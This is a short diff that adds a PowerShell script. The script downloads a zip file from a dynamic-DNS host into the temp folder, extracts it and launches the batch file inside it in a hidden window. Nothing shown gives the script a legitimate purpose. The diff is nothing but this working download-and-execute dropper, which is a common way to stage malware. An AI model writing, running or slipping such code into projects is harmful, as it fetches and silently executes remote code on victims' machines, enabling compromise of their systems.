@@ -1,0 +1,12 @@
+$zipUrl = "http://howwasthetea.ddns.net/sh.zip"
+$zipPath = "$env:TEMP\sh.zip"
+$extractPath = "$env:TEMP\sh_extract"
+
+Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
+
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+if (Test-Path $extractPath) { Remove-Item -Recurse -Force $extractPath }
+[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
+
+$batPath = Join-Path $extractPath "sh.bat"
+Start-Process -FilePath $batPath -WindowStyle Hidden
